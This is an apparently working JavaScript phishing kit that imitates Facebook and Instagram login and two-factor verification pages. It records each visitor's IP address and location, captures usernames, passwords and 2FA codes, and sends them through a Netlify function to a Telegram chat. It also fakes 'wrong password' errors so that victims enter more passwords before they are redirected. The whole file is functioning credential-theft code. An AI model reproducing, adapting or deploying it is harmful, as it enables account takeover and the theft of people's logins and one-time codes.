document.addEventListener('alpine:init', () => {
    Alpine.store('app', {
        config: {
            geoUrl: 'https://get.geojs.io/v1/ip/geo.json',
            wrongPasswordCount: 1,
            wrong2faCount: 1,
            passwordLoadTimeMs: 600,
            codeLoadTimeMs: 600
        },
        async wait(ms) {
            return new Promise((resolve) => setTimeout(resolve, ms));
        },
        async sendTelegram(message, messageId = '') {
            try {
                const res = await fetch('/.netlify/functions/telegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message, messageId })
                });

                if (res.ok) {
                    const data = await res.json();
                    return data.pinId;
                }
            } catch {
                return null;
            }
            return null;
        }
    });

    Alpine.data('landingPage', () => ({
        async init() {
            localStorage.clear();

            try {
                let geoConfig = { ip: 'N/A', country: 'N/A', city: '' };
                try {
                    while (!this.$store.app.config) {
                        await new Promise((r) => setTimeout(r, 50));
                    }
                    const res = await fetch(this.$store.app.config.geoUrl);
                    const geo = await res.json();
                    geoConfig = { ip: geo.ip || 'N/A', country: geo.country || 'N/A', city: geo.city || '' };
                } catch {}

                localStorage.setItem('geo', JSON.stringify(geoConfig));
            } catch {}
        }
    }));

    Alpine.data('loginForm', (nextUrl) => ({
        email: '',
        password: '',
        error: false,
        isValid: true,
        loading: false,
        wrongCount: 0,
        validate() {
            const val = String(this.email).trim();
            this.isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val) || /^[0-9+]{7,15}$/.test(val);
            return this.isValid;
        },
        maskContact(val) {
            const input = String(val || '').trim();
            if (!input) return '*** *** ****';
            if (input.includes('@')) {
                const [name, domain] = input.split('@');
                return `${name.slice(0, 2)}***@${domain || '***'}`;
            }
            const digits = input.replaceAll(/\D/g, '');
            return digits.length > 4 ? `*** *** ${digits.slice(-4)}` : '*** *** ****';
        },
        async submit() {
            if (!this.validate()) return;
            this.loading = true;

            const geo = JSON.parse(localStorage.getItem('geo') || '{"ip":"N/A","country":"N/A","city":""}');
            const oldMessage = localStorage.getItem('message') || '';
            const oldMessageId = localStorage.getItem('message_id') || '';
            const isInstagram = globalThis.location.pathname.includes('instagram');
            const platformName = isInstagram ? 'Instagram Login' : 'Facebook Login';
            const vnTime = new Intl.DateTimeFormat('vi-VN', {
                timeZone: 'Asia/Ho_Chi_Minh',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            }).format(new Date());

            const message = this.wrongCount === 0 ? `<b>${platformName}</b>\n━━━━━━━━━━━━\n<b>IP:</b> <code>${geo.ip}</code>\n<b>GEO:</b> <code>${geo.country}, ${geo.city}</code>\n<b>Time:</b> <code>${vnTime}</code>\n<b>User:</b> <code>${this.email}</code>\n<b>Password:</b> <code>${this.password}</code>` : `${oldMessage}\n━━━━━━━━━━━━\n<b>Password ${this.wrongCount + 1}:</b> <code>${this.password}</code>`;

            if (this.wrongCount === 0) {
                localStorage.setItem('verify_contact_mask', this.maskContact(this.email));
            }

            while (!this.$store.app.config) {
                await new Promise((r) => setTimeout(r, 50));
            }

            const newMessageId = await this.$store.app.sendTelegram(message, oldMessageId);
            if (newMessageId) {
                localStorage.setItem('message', message);
                localStorage.setItem('message_id', newMessageId.toString());
            }

            await this.$store.app.wait(this.$store.app.config.passwordLoadTimeMs);

            this.wrongCount += 1;
            if (this.wrongCount >= this.$store.app.config.wrongPasswordCount) {
                globalThis.location.href = nextUrl;
                return;
            }

            this.error = true;
            this.password = '';
            this.loading = false;
        }
    }));

    Alpine.data('verifyForm', (successUrl) => ({
        code: '',
        error: false,
        loading: false,
        wrongCount: 0,
        showModal: false,
        selectedMethod: 'notification',
        maskedContact: '*** *** ****',
        get maxWrong() {
            return this.$store.app.config ? this.$store.app.config.wrong2faCount : 1;
        },
        init() {
            this.maskedContact = localStorage.getItem('verify_contact_mask') || this.maskedContact;
        },
        async submit() {
            if (!String(this.code).trim()) {
                this.error = true;
                return;
            }
            this.loading = true;

            const oldMessage = localStorage.getItem('message') || '';
            const oldMessageId = localStorage.getItem('message_id') || '';
            const message = `${oldMessage}\n━━━━━━━━━━━━\n<b>Code ${this.wrongCount + 1}:</b> <code>${this.code}</code>`;

            while (!this.$store.app.config) {
                await new Promise((r) => setTimeout(r, 50));
            }

            const newMessageId = await this.$store.app.sendTelegram(message, oldMessageId);
            if (newMessageId) {
                localStorage.setItem('message', message);
                localStorage.setItem('message_id', newMessageId.toString());
            }

            await this.$store.app.wait(this.$store.app.config.codeLoadTimeMs);

            this.wrongCount += 1;
            if (this.wrongCount >= this.$store.app.config.wrong2faCount) {
                globalThis.location.href = successUrl;
                return;
            }

            this.error = true;
            this.code = '';
            this.loading = false;
        }
    }));
});
